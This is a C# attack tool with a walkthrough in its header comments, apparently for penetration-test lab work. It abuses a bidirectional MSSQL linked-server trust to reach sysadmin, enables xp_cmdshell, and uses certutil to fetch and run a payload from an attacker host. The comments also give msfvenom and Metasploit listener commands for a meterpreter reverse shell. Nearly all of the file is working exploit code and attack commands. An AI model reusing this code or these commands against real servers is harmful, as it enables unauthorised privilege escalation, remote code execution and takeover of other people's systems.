// ================================================================
// LinkedSQLPrivEscRevShell.cs — Bidirectional SQL Linked Server Priv Esc + Reverse Shell
// ================================================================
// WHAT THIS DOES:
//   Exploits a bidirectional MSSQL linked server trust to achieve privilege
//   escalation and remote code execution. The attack chain:
//
//     You connect to APPSRV01 (as a low-privilege user)
//       -> APPSRV01 has a linked server TO DC01
//         -> DC01 has a linked server BACK TO APPSRV01
//           -> This bidirectional trust means queries sent:
//              APPSRV01 -> DC01 -> APPSRV01 execute as DC01's SA (sa/sysadmin)
//
//   This gives you sysadmin privilege on APPSRV01 via DC01's trust!
//
//   The tool then:
//     1. Verifies the privilege escalation (SYSTEM_USER should show 'sa')
//     2. Enables advanced options on APPSRV01 (through DC01)
//     3. Enables xp_cmdshell on APPSRV01 (through DC01)
//     4. Uses xp_cmdshell on APPSRV01 (through DC01) to:
//          a. Download your payload using certutil from your Kali server
//          b. Execute the payload -> reverse shell / meterpreter callback
//
// PREREQUISITES:
//   - SQL access to APPSRV01 (any user, even public)
//   - APPSRV01 has a linked server to DC01
//   - DC01 has a linked server back to APPSRV01
//   - The DC01 -> APPSRV01 link uses a high-privilege account (sa or sysadmin)
//
// ----------------------------------------------------------------
// ARGUMENTS (all required, positional)
// ----------------------------------------------------------------
//   Arg 1: <appsrv_ip>         IP of APPSRV01 (the server you connect to directly)
//   Arg 2: <dc_link_name>      Name of the linked server on APPSRV01 pointing to DC01
//                              (find with: SELECT name FROM sys.servers)
//   Arg 3: <app_link_name>     Name of the linked server on DC01 pointing back to APPSRV01
//                              (find by running queries through DC01)
//   Arg 4: <attacker_ip>       Your Kali IP address
//   Arg 5: <http_port>         Port where you're hosting the payload file on Kali
//   Arg 6: <payload_filename>  Filename of your payload (e.g. reverse.exe)
//
//   Example:
//     LinkedSQLPrivEscRevShell.exe 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe
//
// ----------------------------------------------------------------
// PREPARE YOUR PAYLOAD (on Kali)
// ----------------------------------------------------------------
//   msfvenom -p windows/x64/meterpreter/reverse_tcp \
//     LHOST=<YOUR_IP> LPORT=443 -f exe -o reverse.exe
//   cp reverse.exe /var/www/html/
//   python3 -m http.server 8000
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:LinkedSQLPrivEscRevShell.exe LinkedSQLPrivEscRevShell.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "LinkedSQLPrivEscRevShell", Framework: .NET Framework 4.x
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\LinkedSQLPrivEscRevShell.exe
//
// ----------------------------------------------------------------
// RUN — COMPLETE ATTACK WORKFLOW
// ----------------------------------------------------------------
//
//   STEP 1 — Enumerate linked servers on APPSRV01:
//     Run sql-v2.exe or mssql-runner.cs first to discover:
//     - What linked server name APPSRV01 calls DC01 (Arg 2)
//     - What linked server name DC01 calls APPSRV01 (Arg 3)
//     Use: EXEC sp_linkedservers  and
//          SELECT * FROM sys.servers  (run through the DC01 link)
//
//   STEP 2 — Host payload and start listener on Kali:
//     python3 -m http.server 8000
//     msfconsole -q -x "use exploit/multi/handler; \
//       set payload windows/x64/meterpreter/reverse_tcp; \
//       set LHOST <YOUR_IP>; set LPORT 443; exploit -j"
//
//   STEP 3 — Run this tool:
//     LinkedSQLPrivEscRevShell.exe 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe
//
//   Expected output:
//     [+] Connected to 192.168.146.6
//     [+] Elevated as: sa
//     [*] Enabling advanced options...
//     [*] Enabling xp_cmdshell...
//     [*] Executing payload download & run...
//     [+] Payload sent. Check your listener.
//
// ================================================================
// LinkedSQLPrivEscRevShell.cs
// Tool for bidirectional linked SQL Server privilege escalation + reverse shell
// Usage: LinkedSQLPrivEscRevShell.exe <appsrv_ip> <dc_link_name> <app_link_name> <attacker_ip> <http_port> <payload_filename>
// Example: LinkedSQLPrivEscRevShell.exe 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe

using System;
using System.Data.SqlClient;

namespace SQLLinkedRevShell
{
    class Program
    {
        static void Main(string[] args)
        {
            // Parse command-line arguments
            if (args.Length != 6)
            {
                Console.WriteLine("Usage: <appsrv_ip> <dc_link_name> <app_link_name> <attacker_ip> <http_port> <payload_file>");
                Console.WriteLine("Example: 192.168.146.6 DC01 APPSRV01 192.168.45.242 8000 reverse.exe");
                return;
            }

            string sqlServer = args[0];      // IP of initial SQL server (appsrv01)
            string dcLink = args[1];         // Linked server name for DC01 on appsrv01
            string appLink = args[2];        // Linked server name for APPSRV01 on DC01
            string attackerIP = args[3];     // Your attacker IP
            string httpPort = args[4];       // Port hosting payload
            string payloadFile = args[5];    // Filename of payload (e.g. reverse.exe)

            string database = "master";

            // Connection uses current Windows user (Integrated Security)
            string conString = $"Server={sqlServer};Database={database};Integrated Security=True;";

            using (SqlConnection con = new SqlConnection(conString))
            {
                try { con.Open(); Console.WriteLine("[+] Connected to " + sqlServer); }
                catch (Exception e) { Console.WriteLine("[-] Connection failed: " + e.Message); return; }

                // Verify privilege escalation (should show 'sa')
                Console.WriteLine("[*] Checking elevated context...");
                string verify = $"SELECT SYSTEM_USER AS mylogin FROM OPENQUERY(\"{dcLink}\", 'SELECT SYSTEM_USER AS mylogin FROM OPENQUERY(\"{appLink}\", ''SELECT SYSTEM_USER AS mylogin'')')";
                ExecQuery(con, verify, "Elevated as");

                // Enable show advanced options on target (appsrv01 via DC01)
                Console.WriteLine("[*] Enabling advanced options...");
                Exec(con, $"EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT [{appLink}]') AT [{dcLink}]");

                // Enable xp_cmdshell on target
                Console.WriteLine("[*] Enabling xp_cmdshell...");
                Exec(con, $"EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT [{appLink}]') AT [{dcLink}]");

                // Build payload command
                string url = $"http://{attackerIP}:{httpPort}/{payloadFile}";
                string path = $@"C:\Users\Public\{payloadFile}";
                string payloadCmd = $"cmd /c certutil -urlcache -f {url} {path} && {path}";

                Console.WriteLine("[*] Executing payload download & run...");
                Exec(con, $"EXEC ('EXEC (''xp_cmdshell ''''{payloadCmd}'''' '') AT [{appLink}]') AT [{dcLink}]");

                Console.WriteLine("[+] Payload sent. Check your listener.");
            }
        }

        // Helper: Execute query and print first column if reader
        static void ExecQuery(SqlConnection con, string query, string prefix)
        {
            try
            {
                using (SqlCommand cmd = new SqlCommand(query, con))
                using (SqlDataReader r = cmd.ExecuteReader())
                {
                    if (r.Read()) Console.WriteLine($"[+] {prefix}: {r.GetString(0)}");
                }
            }
            catch (Exception e) { Console.WriteLine("[-] Query error: " + e.Message); }
        }

        // Helper: Execute non-query (config changes, xp_cmdshell)
        static void Exec(SqlConnection con, string query)
        {
            try
            {
                using (SqlCommand cmd = new SqlCommand(query, con))
                {
                    cmd.CommandTimeout = 120;
                    cmd.ExecuteNonQuery();
                }
            }
            catch (Exception e) { Console.WriteLine("[-] Exec error: " + e.Message); }
        }
    }
}